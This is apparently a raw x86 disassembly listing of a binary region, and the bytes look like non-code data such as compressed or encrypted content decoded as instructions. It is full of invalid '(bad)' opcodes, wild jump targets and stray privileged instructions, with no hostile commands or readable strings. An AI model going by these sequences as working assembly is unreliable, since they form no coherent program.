  42e5d4:	jmp    0xe9b51f1e
  42e5d9:	aad    0x74
  42e5db:	inc    ebp
  42e5dc:	jmp    0x5147d9e5
  42e5e1:	jg     0x42e572
  42e5e3:	jno    0x42e56f
  42e5e5:	cmp    bl,BYTE PTR [eax+esi*8+0x4a9c8aea]
  42e5ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e5ed:	jle    0x42e5e4
  42e5ef:	jg     0x42e5de
  42e5f1:	sbb    al,ah
  42e5f3:	jg     0x42e669
  42e5f5:	jnp    0x42e643
  42e5f7:	push   ecx
  42e5f8:	sbb    al,0x4
  42e5fa:	hlt    
  42e5fb:	mov    BYTE PTR [ecx+0xf7],ch
	...
  42e615:	add    BYTE PTR [eax],al
  42e617:	and    dh,BYTE PTR [edx+0x5c]
  42e61a:	sbb    BYTE PTR [ebx-0x29],dh
  42e61d:	clc    
  42e61e:	jle    0x42e5e9
  42e620:	add    BYTE PTR [esi-0x38],ch
  42e623:	inc    ebx
  42e624:	jge    0x42e5d4
  42e626:	imul   esp,DWORD PTR [edi-0x5549ff90],0xffffff89
  42e62d:	lock push 0xedfffaa1
  42e633:	ja     0x42e62c
  42e635:	sbb    al,0x69
  42e637:	hlt    
  42e638:	ins    DWORD PTR es:[edi],dx
  42e639:	add    BYTE PTR ds:0x91756d48,bl
  42e63f:	(bad)  
  42e640:	pop    ds
  42e641:	xor    ch,cl
  42e643:	test   DWORD PTR [ecx+0x3dcf1fc2],0xaaf7d9be
  42e64d:	jbe    0x42e638
  42e64f:	cli    
  42e650:	test   bh,ah
  42e652:	push   eax
  42e653:	ins    BYTE PTR es:[edi],dx
  42e654:	jae    0x42e6cb
  42e656:	inc    esp
  42e657:	jle    0x42e623
  42e659:	pop    es
  42e65a:	bound  esp,QWORD PTR [eax+edi*2+0x4506e189]
  42e661:	out    0x4a,eax
  42e663:	pushf  
  42e664:	xchg   esp,ebp
  42e666:	cwde   
  42e667:	enter  0x7cef,0xe1
  42e66b:	idiv   ecx
  42e66d:	add    dh,BYTE PTR [ecx-0x36]
  42e670:	jo     0x42e674
  42e672:	imul   ecx,DWORD PTR [esi],0xe7ac86f3
  42e678:	mov    edi,0xd5e7
	...
  42e691:	add    BYTE PTR [eax],al
  42e693:	add    BYTE PTR [ecx],cl
  42e695:	ins    BYTE PTR es:[edi],dx
  42e696:	sti    
  42e697:	bound  ebx,QWORD PTR [edi]
  42e699:	mov    dl,bh
  42e69b:	xor    dl,0xac
  42e69e:	push   ebx
  42e69f:	jmp    0x972a6b9e
  42e6a4:	jbe    0x42e690
  42e6a6:	imul   ecx
  42e6a8:	mov    ecx,0x41e9fac9
  42e6ad:	test   DWORD PTR [edi+0x4f6e9],edi
  42e6b3:	ins    BYTE PTR es:[edi],dx
  42e6b4:	lods   eax,DWORD PTR ds:[esi]
  42e6b5:	jmp    0xfb:0x6bbd6807
  42e6bc:	xor    dh,BYTE PTR [edx+0x77]
  42e6bf:	or     DWORD PTR [esi-0xe],esi
  42e6c2:	idiv   bh
  42e6c4:	loop   0x42e68c
  42e6c6:	inc    esp
  42e6c7:	dec    DWORD PTR [edx*2-0x1eaa8a74]
  42e6ce:	cmp    esi,DWORD PTR ds:0xc084041d
  42e6d4:	jmp    0x9b8de0e
  42e6d9:	jge    0x42e730
  42e6db:	adc    BYTE PTR [edx+0x78],dh
  42e6de:	pop    es
  42e6df:	mov    ebx,DWORD PTR [eax]
  42e6e1:	icebp  
  42e6e2:	or     bl,0x75
  42e6e5:	push   ebx
  42e6e6:	bnd call DWORD PTR [edx+0x7e]
  42e6ea:	lock adc DWORD PTR [ebx+0x6b],0x785d06fb
  42e6f2:	sbb    al,0x80
  42e6f4:	mov    al,ds:0x73fff0
	...
  42e711:	push   0x25f874f1
  42e716:	jnp    0x42e74d
  42e718:	add    BYTE PTR [ebp-0x79a14184],bl
  42e71e:	mov    edx,0xb18d10b9
  42e723:	jb     0x42e725
  42e725:	mov    al,BYTE PTR [ebx-0x8e7161d]
  42e72b:	je     0x42e712
  42e72d:	push   ss
  42e72e:	dec    eax
  42e72f:	repz mov esp,DWORD PTR [eax-0x5]
  42e733:	mov    BYTE PTR [ecx],al
  42e735:	ds ret 
  42e737:	loop   0x42e71c
  42e739:	loopne 0x42e777
  42e73b:	pop    ds
  42e73c:	adc    BYTE PTR [ebp+0x3d2473f0],cl
  42e742:	lock jae 0x42e769
  42e745:	pop    ebp
  42e746:	lock jae 0x42e76d
  42e749:	dec    ebp
  42e74a:	fstp   TBYTE PTR [esi]
  42e74c:	push   esp
  42e74e:	push   esi
  42e74f:	jl     0x42e710
  42e751:	test   eax,0x487f6ae2
  42e756:	jns    0x42e6e0
  42e758:	push   ecx
  42e759:	cld    
  42e75a:	or     cl,BYTE PTR [ecx-0x76f13de7]
  42e760:	clc    
  42e761:	repz test ebx,0x380e6f37
  42e768:	daa    
  42e769:	daa    
  42e76a:	pop    esi
  42e76b:	lods   al,BYTE PTR ds:[esi]
  42e76c:	sar    bl,1
  42e76e:	(bad)  
  42e76f:	aas    
  42e770:	daa    
  42e771:	push   es
  42e772:	in     al,0xf1
  42e774:	sti    
	...
  42e78d:	add    BYTE PTR [edi+0x6c],ch
  42e790:	add    ecx,DWORD PTR [ecx-0x54f40797]
  42e796:	arpl   WORD PTR [eax+0x76f7f000],si
  42e79c:	pop    ss
  42e79d:	sbb    BYTE PTR [ecx+0x74],0xff
  42e7a1:	mov    BYTE PTR [ecx],ch
  42e7a3:	in     al,0xf2
  42e7a5:	pop    es
  42e7a6:	jg     0x42e747
  42e7a8:	pop    ds
  42e7a9:	mov    DWORD PTR [ecx],edi
  42e7ab:	fs push 0x7b16d02
  42e7b1:	xchg   DWORD PTR [ebx],ebp
  42e7b3:	cld    
  42e7b4:	mov    BYTE PTR [ecx-0x8],bl
  42e7b7:	add    bl,bl
  42e7b9:	repz repz out dx,al
  42e7bc:	(bad)  [ebx]
  42e7be:	test   DWORD PTR [eax+0x7],0xf27e9fb
  42e7c5:	inc    eax
  42e7c6:	hlt    
  42e7c7:	loope  0x42e78c
  42e7c9:	aaa    
  42e7ca:	rcr    BYTE PTR [edx+esi*8+0x1e],0x6f
  42e7cf:	mov    eax,ds:0xf30ce707
  42e7d4:	leave  
  42e7d5:	idiv   DWORD PTR [ecx-0x48]
  42e7d8:	pop    es
  42e7d9:	out    0xfa,eax
  42e7db:	loope  0x42e7e3
  42e7dd:	mov    dl,ch
  42e7df:	add    al,0x2b
  42e7e1:	les    ecx,FWORD PTR [edx]
  42e7e3:	inc    esi
  42e7e4:	push   edi
  42e7e5:	jb     0x42e832
  42e7e7:	stc    
  42e7e8:	aam    0x7
  42e7ea:	mov    ecx,0xca470e70
  42e7ef:	push   0xd0ce
	...
  42e808:	add    BYTE PTR [eax],al
  42e80a:	add    bh,ch
  42e80c:	add    dh,BYTE PTR [esp+ebp*1]
  42e80f:	jae    0x42e7d9
  42e811:	loopne 0x42e881
  42e813:	add    DWORD PTR [edx+0x1c],edi
  42e816:	jl     0x42e833
  42e818:	inc    esi
  42e819:	mov    cs,WORD PTR [eax]
  42e81b:	xchg   esi,eax
  42e81c:	jns    0x42e817
  42e81e:	loope  0x42e89c
  42e820:	pop    ss
  42e821:	inc    dx
  42e823:	add    al,BYTE PTR [ebx+0x43c306a9]
  42e829:	div    DWORD PTR [ebx-0xd]
  42e82c:	clc    
  42e82d:	jl     0x42e836
  42e82f:	xor    DWORD PTR [ecx-0x52],esi
  42e832:	inc    esi
  42e833:	push   edx
  42e834:	dec    esi
  42e835:	jle    0x42e863
  42e837:	sbb    BYTE PTR [ecx],cl
  42e839:	fcomp  QWORD PTR [edi]
  42e83b:	jnp    0x42e804
  42e83d:	lock outs dx,BYTE PTR ds:[esi]
  42e83f:	jecxz  0x42e8ba
  42e841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e842:	jnp    0x42e807
  42e844:	inc    ebp
  42e845:	ds push cs
  42e847:	jae    0x42e85d
  42e849:	jo     0x42e85d
  42e84b:	xor    eax,DWORD PTR [edi-0x1b]
  42e84e:	xchg   BYTE PTR [eax+ecx*1+0x731244ee],dh
  42e855:	out    0xf0,al
  42e857:	lahf   
  42e858:	add    DWORD PTR [edi+esi*2+0x649741cb],ebp
  42e85f:	das    
  42e860:	iret   
  42e861:	lods   eax,DWORD PTR ds:[esi]
  42e862:	dec    esp
  42e863:	inc    edx
  42e864:	or     cl,ch
  42e866:	shl    BYTE PTR [edx+0x60],1
  42e869:	push   0xe9049468
  42e86e:	add    eax,DWORD PTR [eax]
	...
  42e888:	mov    ebx,0xde9dffd6
  42e88d:	test   DWORD PTR [ebx],0x2b5cd862
  42e893:	pusha  
  42e894:	clc    
  42e895:	add    al,0xb
  42e897:	xchg   esi,eax
  42e898:	mov    bh,0x7b
  42e89a:	inc    ebp
  42e89b:	fisttp QWORD PTR [edi-0x78198bfd]
  42e8a1:	add    ebp,ecx
  42e8a3:	or     eax,0xfa0004fb
  42e8a8:	retf   0x36e2
  42e8ab:	stos   BYTE PTR es:[edi],al
  42e8ac:	and    al,0x7
  42e8ae:	ret    
  42e8af:	and    al,0xa4
  42e8b1:	outs   dx,BYTE PTR ds:[esi]
  42e8b2:	sti    
  42e8b3:	jmp    0x95886eaf
  42e8b8:	iret   
  42e8b9:	iret   
  42e8ba:	nop    edi
  42e8bd:	pushf  
  42e8be:	(bad)  
  42e8bf:	adc    al,0xeb
  42e8c1:	daa    
  42e8c2:	std    
  42e8c3:	xchg   bh,dh
  42e8c5:	add    al,0x7f
  42e8c7:	mov    cl,0xff
  42e8c9:	jge    0x42e910
  42e8cb:	jge    0x42e939
  42e8cd:	and    BYTE PTR [eax+0x6e],0x5e
  42e8d1:	jo     0x42e923
  42e8d3:	les    ax,DWORD PTR [eax]
  42e8d6:	mov    DWORD PTR [ebx+edx*2+0x70595d7e],edi
  42e8dd:	retf   0x60e7
  42e8e0:	pushf  
  42e8e1:	push   0x6f976cc3
  42e8e6:	sti    
  42e8e7:	ds jecxz 0x42e8ee
  42e8ea:	add    cl,ch
	...
  42e904:	add    BYTE PTR [esi],bl
  42e906:	adc    dh,ah
  42e908:	fidiv  DWORD PTR [edi-0x7bd67b94]
  42e90e:	pop    es
  42e90f:	sub    DWORD PTR cs:[eax],ebx
  42e912:	aas    
  42e913:	(bad)  
  42e914:	call   0xed786d10
  42e919:	jmp    0x42e8df
  42e91b:	(bad)  
  42e91c:	call   DWORD PTR [edx+0x6a64857d]
  42e922:	out    dx,al
  42e923:	not    BYTE PTR [eax-0x28]
  42e926:	inc    esp
  42e927:	mov    edi,0x84d54a50
  42e92c:	ror    BYTE PTR [edx+0x7b],0xba
  42e930:	mov    BYTE PTR [eax],al
  42e932:	jmp    0x42e965
  42e934:	shl    DWORD PTR [ecx+0x514f8321],cl
  42e93a:	jns    0x42e8c1
  42e93c:	push   0x3bf6ee3a
  42e941:	pop    esp
  42e942:	je     0x42e948
  42e944:	sub    ecx,DWORD PTR [eax+eax*4+0x45]
  42e948:	lock xchg esi,eax
  42e94a:	std    
  42e94b:	add    BYTE PTR [ebp-0x911ff],0x16
  42e952:	(bad)  
  42e953:	jl     0x42e95a
  42e955:	ss (bad) 
  42e957:	mov    BYTE PTR [ebp+0x79],al
  42e95a:	jns    0x42e9a1
  42e95c:	hlt    
  42e95d:	pop    esi
  42e95e:	loope  0x42e959
  42e960:	mov    BYTE PTR [eax],dl
  42e962:	lods   eax,DWORD PTR ds:[esi]
  42e963:	je     0x42e9b1
  42e965:	bound  ebp,QWORD PTR [edi+edi*2+0x0]
	...
  42e980:	add    BYTE PTR [eax],al
  42e982:	int    0x7
  42e984:	and    BYTE PTR [eax+eiz*8+0x7f],dh
  42e988:	pop    ebp
  42e989:	adc    esp,DWORD PTR [esi]
  42e98b:	dec    eax
  42e98c:	dec    esi
  42e98d:	lea    edx,[eax+0x75]
  42e990:	idiv   bh
  42e992:	sub    dl,BYTE PTR [ecx-0x74]
  42e995:	inc    ebp
  42e996:	adc    DWORD PTR [ecx-0xa],edx
  42e999:	(bad)  
  42e99a:	adc    cl,al
  42e99c:	push   es
  42e99d:	xchg   ebp,eax
  42e99e:	push   eax
  42e99f:	adc    BYTE PTR [eax],bh
  42e9a1:	pop    ebp
  42e9a2:	mov    esi,0x4a8b235b
  42e9a7:	imul   eax,DWORD PTR [edx-0x913aa7b],0xffffffff
  42e9ae:	hlt    
  42e9af:	push   esi
  42e9b0:	ds jge 0x42e9a4
  42e9b3:	inc    esi
  42e9b4:	mov    DWORD PTR ds:[ecx+0x7f0b8cf9],edi
  42e9bb:	loopne 0x42e9ac
  42e9bd:	cli    
  42e9be:	arpl   WORD PTR [edx+0x3c],si
  42e9c1:	rcr    ecx,0x67
  42e9c4:	sub    al,0xc1
  42e9c6:	jge    0x42e9e0
  42e9c8:	ins    BYTE PTR es:[edi],dx
  42e9c9:	out    0xf7,eax
  42e9cb:	cmc    
  42e9cc:	leave  
  42e9cd:	push   cs
  42e9ce:	cld    
  42e9cf:	xor    BYTE PTR [edx+0x75],bh
  42e9d2:	in     eax,dx
  42e9d3:	adc    eax,0xda030ed3
  42e9d8:	jbe    0x42e9d4
  42e9da:	sub    ebp,DWORD PTR [edx+0x6609fad4]
  42e9e0:	or     al,BYTE PTR [eax-0xc]
  42e9e3:	out    0x76,al
  42e9e5:	aaa    
	...
  42e9fe:	add    BYTE PTR [edi],cl
  42ea00:	jb     0x42ea7d
  42ea02:	cmp    eax,0x53788a0b
  42ea07:	add    ebp,DWORD PTR [eax+0x43]
  42ea0a:	adc    BYTE PTR [ebp+ebx*2-0x1380b130],dh
  42ea11:	ja     0x42ea28
  42ea13:	add    al,0x51
  42ea15:	mov    edi,0x7ef1eff
  42ea1a:	test   BYTE PTR [eax],dl
  42ea1c:	(bad)  [edi-0x5]
  42ea1f:	jg     0x42ea82
  42ea21:	pop    es
  42ea22:	sti    
  42ea23:	inc    ebx
  42ea24:	push   0x8be9fad1
  42ea29:	cmovo  esi,esp
  42ea2c:	in     al,0xb9
  42ea2e:	mov    edi,0xbea1eef
  42ea33:	inc    edx
  42ea34:	sub    ecx,DWORD PTR [edx]
  42ea36:	rol    BYTE PTR [esp+ebx*4],0xff
  42ea3a:	call   0xfbbb052f
  42ea3f:	mov    edx,0xf57cac05
  42ea44:	loop   0x42ea25
  42ea46:	(bad)  
  42ea47:	aas    
  42ea48:	cli    
  42ea49:	ins    BYTE PTR es:[edi],dx
  42ea4a:	repnz hlt 
  42ea4c:	add    al,0xe9
  42ea4e:	mov    WORD PTR [ecx-0x74419008],?
  42ea54:	jle    0x42e9fa
  42ea56:	push   edi
  42ea57:	sbb    eax,eax
  42ea59:	sbb    al,0x8a
  42ea5b:	loope  0x42e9fd
  42ea5d:	pusha  
  42ea5e:	mov    esi,0x642c7ea3
	...
  42ea7b:	add    BYTE PTR [ebx],dl
  42ea7d:	rol    al,0x3f
  42ea80:	mov    ecx,0xf403e8ac
  42ea85:	add    al,0x60
  42ea87:	shl    DWORD PTR [edi+0x78],0x2c
  42ea8b:	cwde   
  42ea8c:	les    ebp,FWORD PTR [ecx-0xc]
  42ea8f:	pop    ss
  42ea90:	inc    eax
  42ea91:	(bad)  
  42ea92:	call   0x60dfa423
  42ea97:	fstp   DWORD PTR [edi+0x6a]
  42ea9a:	cld    
  42ea9b:	mul    esp
  42ea9d:	(bad)  
  42ea9e:	call   0xe8b16c26
  42eaa3:	mov    bh,BYTE PTR [ecx-0xc3c0aa4]
  42eaa9:	lock add ecx,DWORD PTR [ecx-0x76e6becf]
  42eab0:	cmp    DWORD PTR [ecx+0x19],edx
  42eab3:	ja     0x42eab6
  42eab5:	adc    eax,0x80d3c3d5
  42eaba:	sub    ecx,esi
  42eabc:	push   edx
  42eabd:	rcr    DWORD PTR [ecx+0x11],cl
  42eac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eac1:	adc    al,0xa9
  42eac3:	add    ebp,DWORD PTR [ebp-0x41]
  42eac6:	push   esp
  42eac7:	cmp    eax,0xbc5951
  42eacc:	in     eax,dx
  42eacd:	(bad)  
  42eace:	cmp    al,dh
  42ead0:	in     eax,dx
  42ead1:	aad    0xff
  42ead3:	xor    eax,0xb4fb59a5
  42ead8:	sbb    edx,edi
  42eada:	cli    
  42eadb:	cld    
  42eadc:	pop    ebx
  42eadd:	adc    al,0x40
  42eadf:	jmp    0x42eae4
	...
  42eaf8:	add    BYTE PTR [esi-0x41],ch
  42eafb:	pop    es
  42eafc:	mov    edx,0x1c3b76c
  42eb01:	push   cs
  42eb02:	push   0xdf4706fb
  42eb07:	add    BYTE PTR [ecx-0x16fffb8c],dl
  42eb0d:	loop   0x42eafe
  42eb0f:	or     esp,DWORD PTR [ecx+0x2d]
  42eb12:	(bad)  
  42eb13:	sti    
  42eb14:	mov    esi,0x549bc80f
  42eb19:	jmp    0x4881e900
  42eb1e:	push   ss
  42eb1f:	(bad)  
  42eb20:	call   0xf5b8591c
  42eb25:	mov    ds:0x37d5080f,al
  42eb2a:	imul   eax,DWORD PTR [esi+0xe2e82c],0xe8453c5c
  42eb34:	mov    es,WORD PTR [ebx+0x49efb6d]
  42eb3a:	jne    0x42eb8e
  42eb3c:	xchg   esi,eax
  42eb3d:	in     al,0x50
  42eb3f:	adc    BYTE PTR [ecx],ch
  42eb41:	clc    
  42eb42:	test   BYTE PTR [ebp-0x26],bh
  42eb45:	lock sti 
  42eb47:	test   BYTE PTR [esi-0x9],dl
  42eb4a:	add    al,0x0
  42eb4c:	mov    al,0xbc
  42eb4e:	pusha  
  42eb4f:	jne    0x42eb32
  42eb51:	jg     0x42eb1d
  42eb53:	push   cs
  42eb54:	and    BYTE PTR [ebp+0x1e57464],ch
  42eb5a:	ret    0xe80e
	...
  42eb75:	add    BYTE PTR [ecx+0x739156b],ch
  42eb7b:	(bad)  
  42eb7e:	and    al,0x45
  42eb80:	out    dx,eax
  42eb81:	cmp    BYTE PTR [eax+0x7e0e7413],al
  42eb87:	out    dx,eax
  42eb88:	je     0x42eb6e
  42eb8a:	loop   0x42ec00
  42eb8c:	jecxz  0x42ebe4
  42eb8e:	rcl    BYTE PTR [esp+esi*4],cl
  42eb91:	adc    BYTE PTR [ebp+0x4],cl
  42eb94:	add    DWORD PTR [ebp-0x6b],0x53
  42eb98:	mov    WORD PTR [ebp+0x29],cs
  42eb9b:	fcomp  QWORD PTR [eax+0x4aeef2fc]
  42eba1:	push   esi
  42eba2:	xchg   eax,edi
  42eba4:	div    BYTE PTR [ebp+0x51]
  42eba7:	out    dx,eax
  42eba8:	into   
  42eba9:	dec    eax
  42ebab:	xlat   BYTE PTR ds:[ebx]
  42ebac:	out    dx,al
  42ebad:	fdiv   st,st(6)
  42ebaf:	sar    BYTE PTR [edi],0x56
  42ebb2:	les    esp,FWORD PTR [edi-0x47c7004d]
  42ebb8:	cmovo  ebx,DWORD PTR ds:0xe9135d2c
  42ebbf:	dec    BYTE PTR [edx-0x1]
  42ebc2:	call   0x35b8e2ab
  42ebc7:	aaa    
  42ebc8:	not    BYTE PTR ds:0x401089
  42ebce:	into   
  42ebcf:	push   ebp
  42ebd0:	punpckldq mm3,DWORD PTR gs:[eax+0x7]
  42ebd5:	mov    al,al
  42ebd7:	mov    edi,?
  42ebd9:	xlat   BYTE PTR ds:[ebx]
	...
  42ebf2:	add    ch,al
  42ebf4:	dec    esi
  42ebf5:	xchg   edi,eax
  42ebf6:	jne    0x42ebc4
  42ebf8:	pop    ebp
  42ebf9:	call   DWORD PTR [ebp+0x5]
  42ebfc:	cli    
  42ebfd:	cli    
  42ebfe:	dec    ebp
  42ec00:	lock je 0x42ec0f
  42ec03:	(bad)  
  42ec04:	clc    
  42ec05:	pop    es
  42ec06:	adc    al,0x9d
  42ec08:	add    eax,DWORD PTR [ebx+0x5dc545]
  42ec0e:	(bad)  
  42ec0f:	hlt    
  42ec10:	mov    al,ds:0xb9f0e84b
  42ec15:	je     0x42ec12
  42ec17:	inc    edi
  42ec18:	mov    edi,0x9ac01c2a
  42ec1d:	(bad)  
  42ec1e:	cli    
  42ec1f:	add    DWORD PTR [edx-0x3d0bbff2],esi
  42ec25:	mov    ecx,0xa31f1
  42ec2a:	je     0x42ec4b
  42ec2c:	gs shr bl,cl
  42ec2f:	add    DWORD PTR [ecx+0x36],ebx
  42ec32:	pop    ebp
  42ec33:	fs xchg ecx,eax
  42ec35:	add    eax,0x6ee86b4f
  42ec3a:	sti    
  42ec3b:	jmp    0x23db639
  42ec40:	sub    dl,BYTE PTR [eax+eax*2]
  42ec43:	hlt    
  42ec44:	mov    al,BYTE PTR [edx+0x3bf2304d]
  42ec4a:	call   0xfbb73647
  42ec4f:	into   
  42ec50:	pop    edi
  42ec51:	int    0x67
  42ec53:	or     ebx,DWORD PTR [ebx-0x1]
  42ec56:	inc    DWORD PTR [eax]
	...
  42ec70:	sub    ebp,DWORD PTR [eax]
  42ec72:	or     bl,bh
  42ec74:	or     DWORD PTR [esi+0xb],esi
  42ec77:	inc    eax
  42ec78:	hlt    
  42ec79:	ret    
  42ec7a:	dec    BYTE PTR [ecx+eax*8+0x1cc388a1]
  42ec81:	jbe    0x42ecfb
  42ec83:	sti    
  42ec84:	add    eax,DWORD PTR [esi-0x715d4016]
  42ec8a:	or     dh,BYTE PTR [eax+0x52041c04]
  42ec90:	jmp    0x42ecdb
  42ec92:	aas    
  42ec93:	adc    BYTE PTR [esp+ebx*2],dh
  42ec96:	mov    DWORD PTR [ebp-0x21],eax
  42ec99:	psrld  mm2,QWORD PTR [esi-0x43]
  42ec9d:	call   0x6fac:0x5c20003
  42eca4:	in     al,dx
  42eca5:	lock cmp DWORD PTR [edx],edi
  42eca8:	sbb    DWORD PTR [ecx-0x24],ebx
  42ecab:	(bad)  
  42ecac:	in     al,dx
  42ecad:	(bad)  
  42ecae:	pop    eax
  42ecaf:	out    dx,eax
  42ecb0:	std    
  42ecb1:	rol    DWORD PTR [ecx-0x12],1
  42ecb4:	xchg   ebx,eax
  42ecb5:	data16 mov ah,0x67
  42ecb8:	inc    esi
  42ecb9:	data16 fsubr QWORD PTR [edi-0x2f173b1c]
  42ecc0:	js     0x42ec7a
  42ecc2:	sub    al,0x88
  42ecc4:	mov    bh,0x5d
  42ecc6:	inc    esi
  42ecc7:	js     0x42ed48
  42ecc9:	data16 mov dh,0xcd
  42eccc:	outs   dx,BYTE PTR ds:[esi]
  42eccd:	lock fdiv QWORD PTR [ecx+eax*1-0x7]
  42ecd2:	fadd   st(3),st
	...
  42ecec:	add    BYTE PTR [ebx-0x7f],ah
  42ecef:	sub    esi,ebp
  42ecf1:	xchg   esp,eax
  42ecf2:	jge    0x42ec88
  42ecf4:	js     0x42ed51
  42ecf6:	popf   
  42ecf7:	repz std 
  42ecf9:	jmp    0x42ed41
  42ecfb:	es add al,0xf8
  42ecfe:	shr    DWORD PTR [ebp-0x30],1
  42ed01:	pop    ss
  42ed02:	std    
  42ed03:	cmp    bl,bl
  42ed05:	jp     0x42ecf0
  42ed07:	add    al,0x18
  42ed09:	mov    al,ds:0x8a6ed0b6
  42ed0e:	add    eax,0xf13487e9
  42ed13:	sub    ecx,DWORD PTR [ecx+0x7327f10f]
  42ed19:	ror    DWORD PTR [eax],0xc5
  42ed1c:	mov    DWORD PTR [ebx],0xe4ebf467
  42ed22:	(bad)  
  42ed23:	call   0x93c2d1a6
  42ed28:	clc    
  42ed29:	push   ds
  42ed2a:	sub    ah,BYTE PTR [ebx]
  42ed2c:	or     BYTE PTR [ecx+0x1b],ch
  42ed2f:	pinsrw mm0,WORD PTR [esi+0x5d],0x0
  42ed34:	push   ecx
  42ed35:	or     DWORD PTR ds:0xfdbe6200,eax
  42ed3b:	mov    dh,ch
  42ed3d:	inc    edx
  42ed3e:	ret    
  42ed3f:	sbb    esi,DWORD PTR [eax-0x51]
  42ed42:	add    DWORD PTR [esi-0x7],esp
  42ed45:	je     0x42ed09
  42ed47:	or     edi,DWORD PTR [ecx-0x61f7be8e]
  42ed4d:	aas    
  42ed4e:	inc    eax
  42ed4f:	xor    cl,ch
	...
  42ed69:	add    bh,dh
  42ed6b:	jge    0x42edaf
  42ed6d:	loope  0x42edac
  42ed6f:	add    eax,DWORD PTR [ecx]
  42ed71:	inc    edx
  42ed72:	mov    dl,dl
  42ed74:	dec    esi
  42ed75:	frstor es:[eax]
  42ed78:	adc    al,0xa9
  42ed7a:	test   ecx,0xfcb9b259
  42ed80:	call   DWORD PTR [esi]
  42ed82:	std    
  42ed83:	and    al,0xda
  42ed85:	stos   BYTE PTR es:[edi],al
  42ed86:	test   DWORD PTR [eax],0x215c7252
  42ed8c:	or     BYTE PTR [ebp+0x1a],bh
  42ed8f:	pop    ebp
  42ed90:	nop
  42ed91:	push   ebx
  42ed92:	lock add al,0x84
  42ed95:	test   eax,0x14fb0f4b
  42ed9a:	in     al,0x48
  42ed9c:	aas    
  42ed9d:	jmp    0xf8bafd48
  42eda2:	aaa    
  42eda3:	test   BYTE PTR gs:[ecx+0x3936ff2b],ch
  42edaa:	in     al,dx
  42edab:	out    dx,eax
  42edac:	add    al,0xfa
  42edae:	mov    bh,0xc4
  42edb0:	out    0xe2,al
  42edb2:	xchg   al,dh
  42edb4:	and    esi,ebp
  42edb6:	sbb    eax,0xe3e1156a
  42edbb:	(bad)  
  42edbc:	push   DWORD PTR [esi]
  42edbe:	cmp    cl,BYTE PTR ds:0x716b3400
  42edc4:	repnz add al,dl
  42edc7:	sub    dh,dl
  42edc9:	inc    ebx
  42edca:	int    0xc
  42edcc:	dec    esi
  42edcd:	push   edi
	...
  42ede6:	add    BYTE PTR [esi+0x55],dl
  42ede9:	add    esi,DWORD PTR [edx+eax*4-0x40]
  42eded:	dec    esp
  42edee:	call   0x26a1:0xc08408cd
  42edf5:	div    DWORD PTR ds:0x3ad4a9
  42edfb:	cmp    bh,ch
  42edfd:	ja     0x42ee10
  42edff:	dec    ebp
  42ee00:	or     BYTE PTR [ebx+0x73de10f0],al
  42ee06:	sbb    al,0x86
  42ee08:	push   esi
  42ee09:	push   DWORD PTR [edx+eiz*4-0x22]
  42ee0d:	inc    esp
  42ee0e:	adc    ch,cl
  42ee10:	pop    ebx
  42ee11:	or     bh,bh
  42ee13:	pusha  
  42ee14:	not    BYTE PTR fs:0x3ff829
  42ee1b:	(bad)  
  42ee1c:	dec    ebp
  42ee1d:	add    eax,esi
  42ee1f:	push   ebx
  42ee20:	or     ebx,esp
  42ee22:	or     eax,0xff0b5c5a
  42ee27:	shl    BYTE PTR [ebx+0x4e],1
  42ee2a:	jmp    DWORD PTR [eax]
  42ee2c:	adc    BYTE PTR [eax+eax*2],dl
  42ee2f:	dec    ebp
  42ee30:	xor    eax,0x58f5d59
  42ee35:	add    dh,dh
  42ee37:	and    BYTE PTR [eax],ch
  42ee39:	(bad)  
  42ee3a:	inc    ebx
  42ee3b:	sbb    eax,0xe18b4e0c
  42ee40:	sub    al,0x8
  42ee42:	je     0x42ee37
  42ee44:	shl    ah,0x99
  42ee47:	sbb    eax,0xc08408
	...
  42ee64:	rcl    DWORD PTR [ebx],0xf7
  42ee67:	xor    eax,0x3ab4f9
  42ee6c:	pop    edx
  42ee6d:	cld    
  42ee6e:	ja     0x42ee81
  42ee70:	hlt    
  42ee71:	sub    eax,0xf9b48504
  42ee76:	cli    
  42ee77:	ss fs jb 0x42ee6d
  42ee7b:	pop    es
  42ee7c:	mov    dl,0x6d
  42ee7e:	inc    BYTE PTR [esi+0x35c6634]
  42ee84:	and    dh,bl
  42ee86:	adc    cl,BYTE PTR [eax]
  42ee88:	jmp    0xb69cee3a
  42ee8d:	imul   edi,edi,0x4e0df9f1
  42ee93:	aas    
  42ee94:	hlt    
  42ee95:	imul   ebx,ecx,0xfc122886
  42ee9b:	jae    0x42ee6f
  42ee9d:	mov    ch,0xb5
  42ee9f:	cdq    
  42eea0:	hlt    
  42eea1:	ins    DWORD PTR es:[edi],dx
  42eea2:	add    eax,0x0
  42eea5:	push   ecx
  42eea6:	jo     0x42eedd
  42eea8:	loopne 0x42ee73
  42eeaa:	(bad)  
  42eeab:	(bad)  
  42eeac:	jp     0x42ef06
  42eeae:	out    0x10,eax
  42eeb0:	mov    ah,0x6d
  42eeb2:	add    al,0xe0
  42eeb5:	inc    eax
  42eeb6:	sub    al,0x70
  42eeb8:	clc    
  42eeb9:	loopne 0x42eeb1
  42eebb:	shl    esp,0x6c
  42eebe:	jl     0x42ef00
  42eec0:	cld    
  42eec1:	push   es
  42eec2:	or     DWORD PTR [edx+0x4b],edx
  42eec5:	cmp    BYTE PTR [edi],ch
  42eec7:	adc    al,0x0
	...
  42eee1:	mov    ah,0x6d
  42eee3:	sar    DWORD PTR [ebp+0x5796df0],1
  42eee9:	aam    0x9b
  42eeeb:	(bad)  
  42eeec:	push   edi
  42eeee:	sbb    edi,DWORD PTR [ebp+0x74]
  42eef1:	fcomp  DWORD PTR [ecx-0xd]
  42eef4:	push   ds
  42eef5:	or     al,0x1a
  42eef7:	xchg   DWORD PTR [eax],eax
  42eef9:	hlt    
  42eefa:	icebp  
  42eefb:	ds je  0x42eeec
  42eefe:	mov    dl,0x32
  42ef00:	sbb    al,0x20
  42ef02:	add    al,0x26
  42ef04:	add    al,0xff
  42ef06:	clc    
  42ef07:	and    BYTE PTR [ebx],dl
  42ef09:	xor    al,0x5
  42ef0b:	ins    BYTE PTR es:[edi],dx
  42ef0c:	inc    ebx
  42ef0d:	pusha  
  42ef0e:	bswap  esi
  42ef10:	repz sti 
  42ef12:	xlat   BYTE PTR ds:[ebx]
  42ef13:	jmp    0x42ef49
  42ef15:	mov    ah,0xc5
  42ef17:	(bad)  
  42ef18:	cld    
  42ef19:	and    eax,0xf827fd62
